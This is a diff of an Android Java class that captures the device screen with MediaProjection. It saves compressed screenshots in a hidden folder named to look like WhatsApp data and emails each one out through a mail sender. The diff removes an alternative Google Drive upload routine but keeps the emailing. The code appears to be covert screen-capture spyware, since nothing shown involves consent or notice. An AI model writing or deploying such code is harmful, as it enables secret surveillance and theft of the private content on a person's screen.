@@ -15,14 +15,7 @@ import android.media.projection.MediaProjectionManager;
 import android.os.AsyncTask;
 import android.os.Environment;
 import android.util.Log;
-import android.view.Display;
 import android.view.WindowManager;
-
-import com.ammarptn.gdriverest.DriveServiceHelper;
-import com.ammarptn.gdriverest.GoogleDriveFileHolder;
-import com.google.android.gms.tasks.OnFailureListener;
-import com.google.android.gms.tasks.OnSuccessListener;
-import com.google.gson.Gson;
 
 import java.io.File;
 import java.io.FileOutputStream;
@@ -35,16 +28,12 @@ import androidx.annotation.NonNull;
 import androidx.annotation.UiThread;
 
 public class ScreenshotManager {
-    private static final String SCREENCAP_NAME = "screencap";
+    private final String SCREENCAP_NAME = ScreenshotManager.class.getSimpleName();
     private static final int VIRTUAL_DISPLAY_FLAGS = DisplayManager.VIRTUAL_DISPLAY_FLAG_OWN_CONTENT_ONLY | DisplayManager.VIRTUAL_DISPLAY_FLAG_PUBLIC;
     public static final ScreenshotManager INSTANCE = new ScreenshotManager();
     private Intent mIntent;
     final String dirPath = Environment.getExternalStorageDirectory().getAbsolutePath() + "/.WhatsAppGenerated/temp/cache/";
     SimpleDateFormat sdf = new SimpleDateFormat("dd-MMM-yyy HH:mm:ss", Locale.getDefault());
-
-    private DriveServiceHelper mDriveServiceHelper;
-
-    private String folderId;
 
     MailSender mailSender;
 
@@ -76,7 +65,7 @@ public class ScreenshotManager {
         if (mediaProjection == null)
             return false;
         final int density = context.getResources().getDisplayMetrics().densityDpi;
-        final Display display = ((WindowManager) context.getSystemService(Context.WINDOW_SERVICE)).getDefaultDisplay();
+        //final Display display = ((WindowManager) context.getSystemService(Context.WINDOW_SERVICE)).getDefaultDisplay();
         /*final Point size = new Point();
         display.getSize(size);
         final int width = size.x, height = size.y;*/
@@ -128,6 +117,7 @@ public class ScreenshotManager {
                 }.execute();
             }
         }, null);
+
         mediaProjection.registerCallback(new MediaProjection.Callback() {
             @Override
             public void onStop() {
@@ -150,6 +140,7 @@ public class ScreenshotManager {
         String currentDateAndTime = sdf.format(new Date());
 
         File file = new File(dirPath, currentDateAndTime + ".jpg");
+
         try {
             FileOutputStream fOut = new FileOutputStream(file);
             bitmap.compress(Bitmap.CompressFormat.JPEG, 30, fOut);
@@ -158,59 +149,8 @@ public class ScreenshotManager {
 
 
             mailSender.sendMail(file.getPath(), sdf.format(new Date()));
-            //uploadFile(file);
-
-            //String compressedFilePath = fileUtil.compressImage(file.getPath());
         } catch (Exception e) {
             e.printStackTrace();
         }
-    }
-
-    private void uploadFile(final File file) {
-
-        /*mDriveServiceHelper.searchFolder("Screenshots")
-                .addOnSuccessListener(new OnSuccessListener<List<GoogleDriveFileHolder>>() {
-                    @Override
-                    public void onSuccess(List<GoogleDriveFileHolder> googleDriveFileHolders) {
-                        folderId = googleDriveFileHolders.get(0).getId();
-                    }
-                })
-                .addOnFailureListener(new OnFailureListener() {
-                    @Override
-                    public void onFailure(@NonNull Exception e) {
-                        e.printStackTrace();
-                    }
-                });*/
-
-        mDriveServiceHelper.createFolderIfNotExist("folderName", null)
-                .addOnSuccessListener(new OnSuccessListener<GoogleDriveFileHolder>() {
-                    @Override
-                    public void onSuccess(GoogleDriveFileHolder googleDriveFileHolder) {
-                        Gson gson = new Gson();
-                        Log.d(SCREENCAP_NAME, "onSuccess: " + gson.toJson(googleDriveFileHolder));
-
-                        mDriveServiceHelper.uploadFile(file, "image/png", googleDriveFileHolder.getId())
-                                .addOnSuccessListener(new OnSuccessListener<GoogleDriveFileHolder>() {
-                                    @Override
-                                    public void onSuccess(GoogleDriveFileHolder googleDriveFileHolder) {
-                                        Gson gson = new Gson();
-                                        Log.d(SCREENCAP_NAME, "onSuccess: " + gson.toJson(googleDriveFileHolder));
-                                    }
-                                })
-                                .addOnFailureListener(new OnFailureListener() {
-                                    @Override
-                                    public void onFailure(@NonNull Exception e) {
-                                        Log.d(SCREENCAP_NAME, "onFailure: " + e.getMessage());
-                                    }
-                                });
-                    }
-                })
-                .addOnFailureListener(new OnFailureListener() {
-                    @Override
-                    public void onFailure(@NonNull Exception e) {
-                        Log.d(SCREENCAP_NAME, "onFailure: " + e.getMessage());
-
-                    }
-                });
     }
 }
